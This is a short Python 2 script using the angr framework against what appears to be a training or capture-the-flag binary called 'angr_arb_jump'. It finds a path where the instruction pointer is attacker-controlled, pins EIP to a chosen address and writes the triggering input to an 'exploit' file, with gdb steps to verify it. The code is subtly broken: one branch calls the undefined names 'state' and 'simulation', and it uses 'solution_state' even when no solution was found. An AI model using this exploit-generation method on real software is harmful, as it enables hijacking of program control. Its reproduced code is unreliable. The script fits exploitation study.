#!/usr/bin/env python

import angr
import claripy

proj = angr.Project('./angr_arb_jump')

initial_state = proj.factory.entry_state()

def check_vulnerable(state):
    return state.se.symbolic(state.regs.eip)

simgr = proj.factory.simgr(initial_state, 
        save_unconstrained=True,
        stashes={
          'active' : [initial_state],
          'unconstrained' : [],
          'found' : [],
          'not_needed' : []
        }
)

def has_found_solution():
    return simgr.found

while (simgr.active or simgr.unconstrained) and (not has_found_solution()):
    for unconstrained_state in simgr.unconstrained:
        if check_vulnerable(unconstrained_state):
            def should_move(s):
                return s is unconstrained_state
            simgr.move('unconstrained', 'found', filter_func=should_move)

        else:
            def should_move(s):
                return s is state
            simulation.move('active', 'not_needed', filter_func=should_move)

    simgr.step()

if simgr.found:
    solution_state = simgr.found[0]

solution_state.add_constraints(solution_state.regs.eip == 0x4d4c4749)

solution = solution_state.posix.dumps(0)

# what is the exploit string?
print solution

# what is the length of the exploit?
print len(solution)

# write exploit to file
f = open('exploit', 'wb')
f.write(solution)
f.close()

# To verify:
# gdb angr_arb_jump
# run < exploit
